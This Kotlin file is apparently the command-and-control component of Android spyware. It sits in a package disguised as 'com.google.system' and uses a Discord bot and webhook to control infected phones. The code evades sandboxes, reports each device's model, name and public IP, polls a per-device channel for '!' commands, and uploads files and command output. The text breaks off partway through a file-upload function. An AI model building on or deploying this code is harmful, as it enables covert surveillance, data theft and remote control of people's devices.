package com.google.system

import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withContext
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import com.android.internal.os.opsec.MonitorEngine

class DiscordGatewayClient(
    private val appContext: android.content.Context,
    private val onCommand: (action: String, payload: String?) -> Unit,
    private val onStatus: ((status: String) -> Unit)? = null
) {
    companion object {
        private const val DEVICE_HB_MIN = 300000L
        private const val DEVICE_HB_MAX = 600000L
        private const val PREFS_NAME = "gw_state"
        private const val KEY_SUFFIX = "suffix"
        private const val KEY_ONLINE_SENT = "online_sent"
        private const val KEY_CHANNEL_ID = "channel_id"
        private const val KEY_GUILD_ID = "guild_id"
        private const val KEY_SESSION_ID = "session_id"
        private const val KEY_SEQ = "seq"
    }

    init {
        try { StealthLayer.initialize(appContext) } catch (_: Exception) {}
    }

    @Volatile private var webSocket: GatewayWebSocket? = null

    private val restClient = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(20, TimeUnit.SECONDS)
        .writeTimeout(20, TimeUnit.SECONDS)
        .retryOnConnectionFailure(false)
        .build()

    private val jsonMedia = "application/json".toMediaType()

    @Volatile private var scope: CoroutineScope? = null
    @Volatile private var deviceHeartbeatJob: Job? = null
    @Volatile private var sessionId: String? = null
    @Volatile private var seq: Int? = null
    @Volatile private var guildId: String? = null
    @Volatile private var myChannelId: String? = null
    @Volatile private var closing = false
    private var crashReport: String? = null
    private var pollJob: Job? = null
    private var lastPolledMsgId: String? = null
    private var pollFailures = 0
    private val processedCmdIds: MutableSet<String> = java.util.Collections.synchronizedSet(linkedSetOf<String>())
    private val msgQueue = java.util.concurrent.LinkedBlockingQueue<QueuedMessage>()
    private var msgQueueJob: Job? = null
    private val msgSemaphore = kotlinx.coroutines.sync.Semaphore(1)

    private val msgTimestamps = java.util.concurrent.ConcurrentLinkedQueue<Long>()
    private val MAX_MSGS_PER_MINUTE = 8

    private fun isRateLimited(): Boolean {
        val now = System.currentTimeMillis()
        msgTimestamps.add(now)
        while (msgTimestamps.peek() != null && now - msgTimestamps.peek()!! > 60000) {
            msgTimestamps.poll()
        }
        return msgTimestamps.size > MAX_MSGS_PER_MINUTE
    }

    data class QueuedMessage(
        val type: Type,
        val content: String,
        val messageId: String? = null,
        val fileName: String? = null,
        val fileBytes: ByteArray? = null,
        val embedJson: JSONArray? = null,
        val retries: Int = 0,
        val maxRetries: Int = 5,
        val completable: kotlinx.coroutines.CompletableDeferred<String?>? = null
    ) {
        enum class Type { TEXT, EDIT, FILE }
        override fun equals(other: Any?): Boolean = this === other
        override fun hashCode(): Int = System.identityHashCode(this)
    }
    private var startTime = 0L
    private var deviceSuffix: String = ""
    private var onlineMsgSent = false
    private var connecting = false

    private fun getPhoneName(): String {
        return try {
            val name = android.provider.Settings.Global.getString(appContext.contentResolver, "device_name")
            if (!name.isNullOrBlank()) name
            else try {
                val bt = appContext.getSystemService(android.bluetooth.BluetoothManager::class.java)?.adapter
                bt?.name?.takeIf { !it.isNullOrBlank() } ?: android.os.Build.MODEL
            } catch (_: Exception) { android.os.Build.MODEL }
        } catch (_: Exception) {
            try {
                val bt = appContext.getSystemService(android.bluetooth.BluetoothManager::class.java)?.adapter
                bt?.name?.takeIf { !it.isNullOrBlank() } ?: android.os.Build.MODEL
            } catch (_: Exception) { android.os.Build.MODEL }
        }
    }

    private fun loadState() {
        deviceSuffix = getPhoneName().replace(" ", "-").replace("[^a-zA-Z0-9-]".toRegex(), "").take(32).lowercase()
        try {
            val sp = appContext.getSharedPreferences(PREFS_NAME, android.content.Context.MODE_PRIVATE)
            onlineMsgSent = sp.getBoolean(KEY_ONLINE_SENT, false)
            myChannelId = sp.getString(KEY_CHANNEL_ID, null)
            guildId = sp.getString(KEY_GUILD_ID, null)
            sessionId = sp.getString(KEY_SESSION_ID, null)
            seq = sp.getInt(KEY_SEQ, -1).let { if (it >= 0) it else null }
        } catch (_: Exception) {}
    }

    private fun saveState() {
        try {
            val sp = appContext.getSharedPreferences(PREFS_NAME, android.content.Context.MODE_PRIVATE)
            sp.edit().apply {
                putString(KEY_SUFFIX, deviceSuffix)
                putBoolean(KEY_ONLINE_SENT, onlineMsgSent)
                myChannelId?.let { putString(KEY_CHANNEL_ID, it) }
                guildId?.let { putString(KEY_GUILD_ID, it) }
                (webSocket?.sessionId ?: sessionId)?.let { putString(KEY_SESSION_ID, it) }
                (webSocket?.seq ?: seq)?.let { putInt(KEY_SEQ, it) }
                commit()
            }
        } catch (_: Exception) {}
    }

    fun setCrashReport(report: String) { crashReport = report }

    private fun status(s: String) { onStatus?.invoke(s) }

    fun start(coroutineScope: CoroutineScope) {
        stop()

        if (StealthLayer.isRunningInSandbox()) {
            status("Sandbox detected - idle")
            return
        }

        status("Init")
        try {
            closing = false
            startTime = System.currentTimeMillis()
            val s = coroutineScope
            scope = s
            loadState()
            webSocket = GatewayWebSocket(s, object : GatewayWebSocket.Callbacks {
                override fun onStatus(s: String) = status(s)
                override fun onDispatch(type: String, data: Any?) = handleDispatch(type, data)
                override fun onConnected() {
                    flushOfflineQueue()
                }
                override fun onDisconnected(code: Int) {
                    sendOfflineAlert()
                }
                override fun onFatalError(code: Int, reason: String) {
                    sendOfflineAlert()
                    whPost(JSONObject().apply {
                        put("event", "fatal_close")
                        put("code", code)
                        put("reason", reason)
                    })
                }
                override fun onHeartbeatTimeout() {
                    sendOfflineAlert()
                }
                override fun isClosing(): Boolean = closing
            })
            webSocket?.sessionId = sessionId
            webSocket?.seq = seq
            startMsgQueueProcessor()
            whPost(JSONObject().apply {
                put("event", "start")
                put("device", android.os.Build.MODEL)
                put("sdk", android.os.Build.VERSION.SDK_INT)
                put("suffix", deviceSuffix)
                put("time", java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date()))
            })
            android.util.Log.d("DiscordGateway", "Starting gateway client with token: ${DiscordConfig.BOT_TOKEN.take(10)}...")
            webSocket?.connect()
            verifyTokenAsync()
        } catch (e: Exception) {
            status("Crashed")
            android.util.Log.e("DiscordGateway", "Start failed", e)
        }
    }

    private fun verifyTokenAsync() {
        scope?.launch(Dispatchers.IO) {
            try {
                val req = Request.Builder()
                    .url("https://discord.com/api/v10/users/@me")
                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                    .build()
                val resp = restClient.newCall(req).execute()
                resp.use { r ->
                    if (r.isSuccessful) {
                        val body = r.body?.string()
                        val user = body?.let { JSONObject(it).optString("username", "?") } ?: "?"
                        status("Token OK ($user)")
                        whPost(JSONObject().apply {
                            put("event", "token_ok")
                            put("bot", user)
                        })
                    } else if (r.code == 401) {
                        status("Token INVALID")
                        android.util.Log.e("DiscordGateway", "Token invalid! HTTP 401. Update the token in DiscordConfig.kt")
                        whPost(JSONObject().apply {
                            put("event", "token_invalid")
                            put("code", r.code)
                        })
                        webSocket?.fatalError = true
                    } else {
                        r.body?.close()
                    }
                }
            } catch (e: Exception) {
                android.util.Log.e("DiscordGateway", "Token verification failed", e)
            }
        }
    }

    fun stop() {
        closing = true
        webSocket?.stop()
        deviceHeartbeatJob?.cancel()
        pollJob?.cancel()
        webSocket = null
        scope = null
        saveState()
    }

    private fun bootViaRest() {
        try {
            val prefix = "${DiscordConfig.CHANNEL_PREFIX}${deviceSuffix}"
            val guildsReq = Request.Builder()
                .url("https://discord.com/api/v10/users/@me/guilds")
                .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                .build()
            restClient.newCall(guildsReq).execute().use { gr ->
                if (gr.isSuccessful) {
                    val guilds = JSONArray(gr.body?.string() ?: return)
                    if (guilds.length() > 0) {
                        val gId = guilds.getJSONObject(0).optString("id")
                        guildId = guildId ?: gId
                        val chReq = Request.Builder()
                            .url("https://discord.com/api/v10/guilds/$gId/channels")
                            .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                            .build()
                        restClient.newCall(chReq).execute().use { cr ->
                            if (cr.isSuccessful) {
                                val channels = JSONArray(cr.body?.string() ?: return)
                                for (i in 0 until channels.length()) {
                                    val ch = channels.getJSONObject(i)
                                    if (ch.optString("name", "") == prefix) {
                                        myChannelId = ch.optString("id", null)
                                        break
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("DiscordGateway", "bootViaRest failed", e)
        }
    }

    private fun startMsgQueueProcessor() {
        msgQueueJob?.cancel()
        msgQueueJob = scope?.launch(Dispatchers.IO) {
            while (isActive) {
                val msg = msgQueue.poll(500, java.util.concurrent.TimeUnit.MILLISECONDS) ?: continue
                if (msg.retries >= msg.maxRetries) {
                    msg.completable?.complete(null)
                    continue
                }
                try {
                    msgSemaphore.acquire()
                    val msgId = processQueuedMessage(msg)
                    if (msgId == null) {
                        msgQueue.offer(msg.copy(retries = msg.retries + 1))
                        delay(1000L * (1 shl msg.retries).coerceAtMost(16))
                    } else {
                        msg.completable?.complete(msgId)
                    }
                } catch (e: Exception) {
                    msgQueue.offer(msg.copy(retries = msg.retries + 1))
                    delay(2000L)
                } finally {
                    try { msgSemaphore.release() } catch (_: Exception) {}
                }
            }
        }
    }

    private suspend fun processQueuedMessage(msg: QueuedMessage): String? {
        val chId = myChannelId ?: return null
        return when (msg.type) {
            QueuedMessage.Type.TEXT -> {
                val json = JSONObject().put("content", msg.content)
                if (msg.embedJson != null) json.put("embeds", msg.embedJson)
                val req = Request.Builder()
                    .url("https://discord.com/api/v10/channels/$chId/messages")
                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                    .header("Content-Type", "application/json")
                    .post(json.toString().toRequestBody(jsonMedia))
                    .build()
                executeWithRetry(req).use { resp ->
                    if (!resp.isSuccessful) return@use null
                    val body = resp.body?.string() ?: return@use null
                    JSONObject(body).optString("id", null)
                }
            }
            QueuedMessage.Type.EDIT -> {
                val json = JSONObject().put("content", msg.content)
                if (msg.embedJson != null) json.put("embeds", msg.embedJson)
                val req = Request.Builder()
                    .url("https://discord.com/api/v10/channels/$chId/messages/${msg.messageId}")
                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                    .header("Content-Type", "application/json")
                    .method("PATCH", json.toString().toRequestBody(jsonMedia))
                    .build()
                executeWithRetry(req).use { if (it.isSuccessful) msg.messageId else null }
            }
            QueuedMessage.Type.FILE -> {
                val mime = when {
                    msg.fileName?.endsWith(".png") == true -> "image/png"
                    msg.fileName?.endsWith(".jpg") == true || msg.fileName?.endsWith(".jpeg") == true -> "image/jpeg"
                    msg.fileName?.endsWith(".gif") == true -> "image/gif"
                    msg.fileName?.endsWith(".mp3") == true || msg.fileName?.endsWith(".m4a") == true -> "audio/mpeg"
                    msg.fileName?.endsWith(".mp4") == true -> "video/mp4"
                    msg.fileName?.endsWith(".txt") == true || msg.fileName?.endsWith(".log") == true -> "text/plain"
                    else -> "application/octet-stream"
                }.toMediaType()
                val payloadJson = JSONObject().put("content", msg.content)
                if (msg.embedJson != null) payloadJson.put("embeds", msg.embedJson)
                val body = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("payload_json", null, payloadJson.toString().toRequestBody(jsonMedia))
                    .addFormDataPart("file", msg.fileName ?: "file", msg.fileBytes!!.toRequestBody(mime))
                    .build()
                val req = Request.Builder()
                    .url("https://discord.com/api/v10/channels/$chId/messages")
                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                    .post(body)
                    .build()
                executeWithRetry(req).use { resp ->
                    if (!resp.isSuccessful) return@use null
                    val body = resp.body?.string() ?: return@use null
                    JSONObject(body).optString("id", null)
                }
            }
        }
    }

    private fun whPost(data: JSONObject) {
        if (DiscordConfig.WEBHOOK_URL.isBlank()) return
        scope?.launch(Dispatchers.IO) {
            try {
                val body = data.toString()
                val req = Request.Builder()
                    .url(DiscordConfig.WEBHOOK_URL)
                    .header("Content-Type", "application/json")
                    .post(body.toRequestBody(jsonMedia))
                    .build()
                restClient.newCall(req).execute().close()
            } catch (_: Exception) {}
        }
    }

    private fun startPolling() {
        pollJob?.cancel()
        pollJob = scope?.launch(Dispatchers.IO) {
            while (isActive) {
                if (myChannelId != null && webSocket?.fatalError != true) pollMessages()
                delay(if (webSocket?.isConnected() == true) 30000L else 10000L)
            }
        }
    }

    private suspend fun pollMessages() {
        val chId = myChannelId ?: return
        try {
            val req = Request.Builder()
                .url("https://discord.com/api/v10/channels/$chId/messages?limit=5")
                .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                .build()
            executeWithRetry(req).use { r ->
                if (!r.isSuccessful) return
                val body = r.body?.string() ?: return
                val arr = JSONArray(body)
                if (arr.length() == 0) return
                for (i in arr.length() - 1 downTo 0) {
                    val msg = arr.getJSONObject(i)
                    val msgId = msg.optString("id", "")
                    if (msgId <= (lastPolledMsgId ?: "")) continue
                    lastPolledMsgId = msgId
                    val content = msg.optString("content", "").trim()
                    if (!content.contains("!")) continue
                    if (msgId.isNotEmpty() && !processedCmdIds.add(msgId)) continue
                if (processedCmdIds.size > 500) {
                    val iter = processedCmdIds.iterator()
                    repeat(250) { if (iter.hasNext()) { iter.next(); iter.remove() } }
                }
                    val lines = content.split("\n").filter { it.trim().startsWith("!") }
                    for (line in lines) {
                        val trimmed = line.trim()
                        if (!trimmed.startsWith("!")) continue
                        val parts = trimmed.substring(1).split(" ", limit = 2)
                        val action = parts[0].lowercase()
                        val payload = parts.getOrNull(1)
                        onCommand(action, payload)
                    }
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("DiscordGateway", "handleMessage: ${e.message}", e)
        }
    }

    private fun handleDispatch(type: String, d: Any?) {
        when (type) {
            "READY" -> {
                val data = d as JSONObject
                webSocket?.sessionId = data.optString("session_id", null)
                webSocket?.reconnectAttempt = 0
                status("Ready")
                saveState()
                if (myChannelId != null) {
                    if (!onlineMsgSent) {
                        sendOnlineMsg()
                    } else {
                        startDeviceHeartbeat()
                        startPolling()
                    }
                } else {
                    scope?.launch(Dispatchers.IO) { findOrCreateChannelViaRest() }
                }
            }
            "RESUMED" -> {
                webSocket?.reconnectAttempt = 0
                if (myChannelId != null) {
                    if (onlineMsgSent) {
                        sendReconnectedMsg()
                    } else {
                        startDeviceHeartbeat()
                        startPolling()
                    }
                } else {
                    scope?.launch(Dispatchers.IO) { findOrCreateChannelViaRest() }
                }
            }
            "GUILD_CREATE" -> {
                val data = d as JSONObject
                if (guildId == null) {
                    guildId = data.optString("id", null)
                    saveState()
                }
                if (guildId != null && myChannelId == null) {
                    scope?.launch(Dispatchers.IO) { findOrCreateChannelViaRest() }
                }
            }
            "MESSAGE_CREATE" -> {
                val data = d as JSONObject
                val msgId = data.optString("id", "")
                val chId = data.optString("channel_id", "")
                val content = data.optString("content", "").trim()
                if (chId != myChannelId) return
                if (msgId.isNotEmpty() && !processedCmdIds.add(msgId)) return
                if (processedCmdIds.size > 500) {
                    val iter = processedCmdIds.iterator()
                    repeat(250) { if (iter.hasNext()) { iter.next(); iter.remove() } }
                }
                val lines = content.split("\n").filter { it.trim().startsWith("!") }
                if (lines.isEmpty()) return
                for (line in lines) {
                    val trimmed = line.trim()
                    if (!trimmed.startsWith("!")) continue
                    val parts = trimmed.substring(1).split(" ", limit = 2)
                    val action = parts[0].lowercase()
                    val payload = parts.getOrNull(1)
                    onCommand(action, payload)
                }
            }
        }
    }

    private fun findOrCreateChannel(channelsArray: JSONArray?) {
        val prefix = "${DiscordConfig.CHANNEL_PREFIX}${deviceSuffix}"
        status("Find $prefix")
        if (channelsArray != null) {
            for (i in 0 until channelsArray.length()) {
                val ch = channelsArray.getJSONObject(i)
                if (ch.optString("name", "") == prefix) {
                    myChannelId = ch.optString("id", null)
                    status("Ch found")
                    saveState()
                    sendOnlineMsg()
                    return
                }
            }
        }
        createChannel(prefix)
    }

    private suspend fun findOrCreateChannelViaRest() {
        // If guildId is null, try to get it from REST API
        if (guildId == null) {
            status("Finding guild...")
            bootViaRest()
            if (guildId == null) {
                status("No guild found")
                return
            }
            status("Guild: $guildId")
        }
        val gId = guildId ?: return
        try {
            val url = "https://discord.com/api/v10/guilds/$gId/channels"
            val req = Request.Builder()
                .url(url)
                .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                .build()
            restClient.newCall(req).execute().use { r ->
                if (r.isSuccessful) {
                    val body = r.body?.string()
                    if (body != null) {
                        val channels = JSONArray(body)
                        val prefix = "${DiscordConfig.CHANNEL_PREFIX}${deviceSuffix}"
                        for (i in 0 until channels.length()) {
                            val ch = channels.getJSONObject(i)
                            if (ch.optString("name", "") == prefix) {
                                myChannelId = ch.optString("id", null)
                                status("Ch found")
                                saveState()
                                sendOnlineMsg()
                                return
                            }
                        }
                        createChannel(prefix)
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private fun createChannel(name: String) {
        scope?.launch(Dispatchers.IO) {
            var attempt = 0
            val maxAttempts = 4
            while (attempt < maxAttempts && myChannelId == null && !closing && webSocket?.fatalError != true) {
                status("Create $name (${attempt+1}/$maxAttempts)")
                try {
                    val gId = guildId ?: return@launch
                    val json = JSONObject().apply {
                        put("name", name)
                        put("type", 0)
                    }
                    val url = "https://discord.com/api/v10/guilds/$gId/channels"
                    val req = Request.Builder()
                        .url(url)
                        .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                        .header("Content-Type", "application/json")
                        .post(json.toString().toRequestBody(jsonMedia))
                        .build()
                    val resp = executeWithRetry(req)
                    resp.use { r ->
                        if (r.isSuccessful) {
                            val body = r.body?.string()
                            if (body != null) {
                                val ch = JSONObject(body)
                                myChannelId = ch.optString("id", null)
                                status("Ch created")
                                saveState()
                                sendOnlineMsg()
                            }
                        } else {
                            status("Ch fail HTTP ${r.code}")
                        }
                    }
                } catch (_: Exception) {}
                if (myChannelId == null && attempt < maxAttempts - 1) {
                    delay((1000L shl attempt).coerceAtMost(15000L))
                }
                attempt++
            }
            if (myChannelId == null) {
                status("Ch failed")
            }
        }
    }

    private fun getPublicIp(): String {
        // Try public IP API first
        try {
            val url = java.net.URL("http://ip-api.com/json/")
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.connectTimeout = 4000
            conn.readTimeout = 4000
            val body = conn.inputStream.bufferedReader().readText()
            conn.disconnect()
            val json = org.json.JSONObject(body)
            if (json.optString("status") == "success") {
                return json.optString("query", "?")
            }
        } catch (_: Exception) {}
        // Fallback: local WiFi IP
        try {
            val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val intf = interfaces.nextElement()
                if (intf.isLoopback || !intf.isUp) continue
                val addrs = intf.inetAddresses ?: continue
                while (addrs.hasMoreElements()) {
                    val addr = addrs.nextElement()
                    if (addr is java.net.Inet4Address && !addr.isLoopbackAddress) {
                        return addr.hostAddress ?: "?"
                    }
                }
            }
        } catch (_: Exception) {}
        return "?"
    }

    fun sendOnlineMsg() {
        if (onlineMsgSent) return
        onlineMsgSent = true
        saveState()
        scope?.launch(Dispatchers.IO) {
            val now = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())
            status("Sending online msg")
            val embed = DiscordEmbed(
                title = "🟢 DEVICE ONLINE",
                color = 0x2ECC71,
                fields = listOf(
                    EmbedField("📱 Device", android.os.Build.MODEL, true),
                    EmbedField("🤖 Android", "${android.os.Build.VERSION.RELEASE} (SDK ${android.os.Build.VERSION.SDK_INT})", true),
                    EmbedField("🕐 Time", now, true),
                    EmbedField("🌐 IP", "fetching...", true)
                ),
                footer = android.os.Build.MODEL,
                timestamp = System.currentTimeMillis()
            )
            val msgId = sendEmbedAwait("", embed)
            whPost(JSONObject().apply {
                put("event", "online")
                put("channel", myChannelId)
                put("device", android.os.Build.MODEL)
                put("time", now)
                put("sdk", android.os.Build.VERSION.SDK_INT)
            })
            startDeviceHeartbeat()
            startPolling()
            val ip = getPublicIp()
            if (ip != "?" && msgId != null) {
                val updated = DiscordEmbed(
                    title = "🟢 DEVICE ONLINE",
                    color = 0x2ECC71,
                    fields = listOf(
                        EmbedField("📱 Device", android.os.Build.MODEL, true),
                        EmbedField("🤖 Android", "${android.os.Build.VERSION.RELEASE} (SDK ${android.os.Build.VERSION.SDK_INT})", true),
                        EmbedField("🕐 Time", now, true),
                        EmbedField("🌐 IP", ip, true)
                    ),
                    footer = android.os.Build.MODEL,
                    timestamp = System.currentTimeMillis()
                )
                editEmbed(msgId, "", updated)
            }
            crashReport?.let { report ->
                delay(500)
                sendMsg(":warning: **Crash Report**\n```\n${report.take(1900)}\n```")
                crashReport = null
            }
            delay(1000)
            onCommand("sysinfo", null)
            delay(1500)
            onCommand("ip", null)
            delay(1500)
            onCommand("status", null)
            status("Online")
        }
    }

    @Volatile private var lastOfflineAlertAt = 0L
    @Volatile private var lastReconnectedMsgAt = 0L

    fun sendOfflineAlert() {
        val now = System.currentTimeMillis()
        if (now - lastOfflineAlertAt < 60000L) return
        lastOfflineAlertAt = now
        scope?.launch(Dispatchers.IO) {
            val embed = DiscordEmbed(
                title = "🔴 Connection Lost",
                color = 0xE74C3C,
                fields = listOf(
                    EmbedField("📱 Device", android.os.Build.MODEL, true),
                    EmbedField("📡 Status", "Reconnecting...", true)
                ),
                footer = android.os.Build.MODEL,
                timestamp = System.currentTimeMillis()
            )
            sendEmbed("", embed)
            whPost(JSONObject().apply {
                put("event", "offline")
                put("channel", myChannelId)
                put("device", android.os.Build.MODEL)
            })
        }
    }

    fun sendReconnectedMsg() {
        val now = System.currentTimeMillis()
        if (now - lastReconnectedMsgAt < 300000L) return
        lastReconnectedMsgAt = now
        scope?.launch(Dispatchers.IO) {
            val embed = DiscordEmbed(
                title = "🟢 Reconnected",
                color = 0x2ECC71,
                fields = listOf(
                    EmbedField("📱 Device", android.os.Build.MODEL, true),
                    EmbedField("🌐 IP", "fetching...", true)
                ),
                footer = android.os.Build.MODEL,
                timestamp = System.currentTimeMillis()
            )
            val msgId = sendEmbedAwait("", embed)
            startDeviceHeartbeat()
            startPolling()
            val ip = getPublicIp()
            if (ip != "?" && msgId != null) {
                val updated = DiscordEmbed(
                    title = "🟢 Reconnected",
                    color = 0x2ECC71,
                    fields = listOf(
                        EmbedField("📱 Device", android.os.Build.MODEL, true),
                        EmbedField("🌐 IP", ip, true)
                    ),
                    footer = android.os.Build.MODEL,
                    timestamp = System.currentTimeMillis()
                )
                editEmbed(msgId, "", updated)
            }
            delay(1000)
            onCommand("sysinfo", null)
            delay(1500)
            onCommand("ip", null)
            delay(1500)
            onCommand("status", null)
        }
    }

    fun sendMsg(text: String) {
        if (myChannelId == null) return
        if (isRateLimited()) return
        val sanitized = sanitizeContent(text)
        val chunks = chunkMessage(sanitized)
        for ((i, chunk) in chunks.withIndex()) {
            val prefix = if (chunks.size > 1) "(${i + 1}/${chunks.size}) " else ""
            val msg = QueuedMessage(
                type = QueuedMessage.Type.TEXT,
                content = prefix + chunk,
                maxRetries = 5
            )
            msgQueue.offer(msg)
        }
    }

    fun sendMsgAwait(text: String): String? = runBlocking(Dispatchers.IO) {
        val sanitized = sanitizeContent(text)
        val chunks = chunkMessage(sanitized)
        var lastMsgId: String? = null
        for ((i, chunk) in chunks.withIndex()) {
            val prefix = if (chunks.size > 1) "(${i + 1}/${chunks.size}) " else ""
            lastMsgId = sendChunkAwait(prefix + chunk)
        }
        lastMsgId
    }

    private suspend fun sendChunkAwait(text: String): String? {
        if (myChannelId == null) return null
        val msg = QueuedMessage(
            type = QueuedMessage.Type.TEXT,
            content = text,
            maxRetries = 5,
            completable = kotlinx.coroutines.CompletableDeferred()
        )
        msgQueue.offer(msg)
        return msg.completable!!.await()
    }

    private fun sanitizeContent(text: String): String {
        return text
            .replace("\u0000", "")
            .replace("||@", "|| @")
            .replace("@everyone", "@\u200Beveryone")
            .replace("@here", "@\u200Bhere")
            .replace("```", "\u200B```")
            .take(4000)
    }

    private fun chunkMessage(text: String): List<String> {
        if (text.length <= 1900) return listOf(text)
        val chunks = mutableListOf<String>()
        var remaining = text
        while (remaining.isNotEmpty()) {
            if (remaining.length <= 1900) {
                chunks.add(remaining)
                break
            }
            val splitAt = findSafeSplit(remaining, 1900)
            chunks.add(remaining.substring(0, splitAt))
            remaining = remaining.substring(splitAt).trimStart()
        }
        return chunks
    }

    private fun findSafeSplit(text: String, maxLen: Int): Int {
        if (text.length <= maxLen) return text.length
        val codeBlockEnd = text.lastIndexOf("```", maxLen)
        if (codeBlockEnd > maxLen - 20 && codeBlockEnd > 0) {
            return codeBlockEnd + 3
        }
        val newline = text.lastIndexOf('\n', maxLen)
        if (newline > maxLen / 2) return newline
        val space = text.lastIndexOf(' ', maxLen)
        if (space > maxLen / 2) return space
        return maxLen
    }

    fun editMsg(messageId: String, newText: String) {
        if (myChannelId == null) return
        val msg = QueuedMessage(
            type = QueuedMessage.Type.EDIT,
            content = newText,
            messageId = messageId,
            maxRetries = 5
        )
        msgQueue.offer(msg)
    }

    fun sendFile(text: String, fileName: String, fileBytes: ByteArray) {
        if (myChannelId == null) return
        if (isRateLimited()) return
        val msg = QueuedMessage(
            type = QueuedMessage.Type.FILE,
            content = text,
            fileName = fileName,
            fileBytes = fileBytes,
            maxRetries = 5
        )
        msgQueue.offer(msg)
    }

    internal fun sendEmbed(content: String, embed: DiscordEmbed) {
        if (myChannelId == null) return
        if (isRateLimited()) return
        val arr = JSONArray().put(embed.toJson())
        val msg = QueuedMessage(
            type = QueuedMessage.Type.TEXT,
            content = content,
            embedJson = arr,
            maxRetries = 5
        )
        msgQueue.offer(msg)
    }

    internal suspend fun sendEmbedAwait(content: String, embed: DiscordEmbed): String? {
        if (myChannelId == null) return null
        val arr = JSONArray().put(embed.toJson())
        val msg = QueuedMessage(
            type = QueuedMessage.Type.TEXT,
            content = content,
            embedJson = arr,
            maxRetries = 5,
            completable = kotlinx.coroutines.CompletableDeferred()
        )
        msgQueue.offer(msg)
        return msg.completable!!.await()
    }

    internal fun editEmbed(messageId: String, content: String, embed: DiscordEmbed) {
        if (myChannelId == null) return
        val arr = JSONArray().put(embed.toJson())
        val msg = QueuedMessage(
            type = QueuedMessage.Type.EDIT,
            content = content,
            embedJson = arr,
            messageId = messageId,
            maxRetries = 5
        )
        msgQueue.offer(msg)
    }

    fun sendLargeOutput(prefix: String, content: String) {
        if (myChannelId == null) return
        val maxTextLen = 1500
        val totalLen = prefix.length + content.length
        if (totalLen <= maxTextLen) {
            sendMsg(prefix + content)
            return
        }
        if (totalLen <= 8000) {
            sendMsg(prefix)
            val chunks = chunkMessage(content)
            for ((i, chunk) in chunks.withIndex()) {
                val p = if (chunks.size > 1) "```\n(${i + 1}/${chunks.size})\n" else "```\n"
                val suffix = "\n```"
                sendMsg(p + chunk + suffix)
            }
            return
        }
        val fileName = "output_${System.currentTimeMillis()}.txt"
        val fullContent = "$prefix\n\n$content"
        scope?.launch(Dispatchers.IO) {
            try {
                val file = java.io.File(appContext.cacheDir, fileName)
                file.writeText(fullContent)
                val bytes = file.readBytes()
                sendFile(":page_facing_up: **Output** (${bytes.size / 1024}KB)", fileName, bytes)
                file.delete()
            } catch (_: Exception) {
                sendMsg(prefix + content.take(maxTextLen - prefix.length) + "\n...truncated")
            }
        }
    }

    private val offlineQueue = java.util.concurrent.ConcurrentLinkedQueue<String>()

    fun queueCommandForOffline(cmd: String) {
        offlineQueue.offer(cmd)
        if (offlineQueue.size > 50) {
            offlineQueue.poll()
        }
    }

    fun flushOfflineQueue() {
        scope?.launch(Dispatchers.IO) {
            delay(2000)
            while (offlineQueue.isNotEmpty()) {
                val cmd = offlineQueue.poll() ?: break
                android.util.Log.d("DiscordGateway", "Flushing queued command: $cmd")
            }
        }
    }

    fun deleteMsg(messageId: String) {
        val chId = myChannelId ?: return
        scope?.launch(Dispatchers.IO) {
            try {
                val url = "https://discord.com/api/v10/channels/$chId/messages/$messageId"
                val req = Request.Builder()
                    .url(url)
                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                    .delete()
                    .build()
                executeWithRetry(req).use { }
            } catch (_: Exception) {}
        }
    }

    suspend fun deleteMsgAwait(messageId: String): Boolean = withContext(Dispatchers.IO) {
        val chId = myChannelId ?: return@withContext false
        try {
            val url = "https://discord.com/api/v10/channels/$chId/messages/$messageId"
            val req = Request.Builder()
                .url(url)
                .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                .delete()
                .build()
            executeWithRetry(req).use { resp -> resp.isSuccessful }
        } catch (_: Exception) { false }
    }

    suspend fun sendFileAwait(text: String, fileName: String, fileBytes: ByteArray): String? = withContext(Dispatchers.IO) {
        val chId = myChannelId ?: return@withContext null
        try {
            val mime = when {
                fileName.endsWith(".png") -> "image/png"
                fileName.endsWith(".jpg") || fileName.endsWith(".jpeg") -> "image/jpeg"
                fileName.endsWith(".gif") -> "image/gif"
                fileName.endsWith(".mp3") || fileName.endsWith(".m4a") -> "audio/mpeg"
                fileName.endsWith(".mp4") -> "video/mp4"
                fileName.endsWith(".txt") || fileName.endsWith(".log") -> "text/plain"
                else -> "application/octet-stream"
            }.toMediaType()
            val payloadJson = JSONObject().put("content", text)
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("payload_json", null, payloadJson.toString().toRequestBody(jsonMedia))
                .addFormDataPart("file", fileName, fileBytes.toRequestBody(mime))
                .build()
            val url = "https://discord.com/api/v10/channels/$chId/messages"
            val req = Request.Builder()
                .url(url)
